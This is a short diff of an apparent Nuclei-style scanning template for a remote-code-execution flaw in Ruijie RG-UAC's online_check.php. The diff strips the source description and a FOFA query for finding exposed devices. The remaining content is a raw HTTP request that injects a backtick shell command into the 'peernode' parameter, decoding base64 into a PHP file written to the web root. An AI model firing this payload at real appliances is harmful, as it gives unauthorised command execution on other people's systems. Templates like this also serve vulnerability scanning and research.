@@ -3,12 +3,8 @@ info:
   name: 锐捷Ruijie-UAC online_check.php RCE漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/di3kklmo31uxoxox'
+  description: ''
   tags: rce,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: di3kklmo31uxoxox
-    fofa: title="RG-UAC登录页面"
 http:
 - raw:
   - 'GET /view/vpn/autovpn/online_check.php?peernode=%20|%20`echo%20PD9waHAgcGhwaW5mbygpOw==%20|%20base64%20-d%20%3E%20dudesite.php` HTTP/1.1
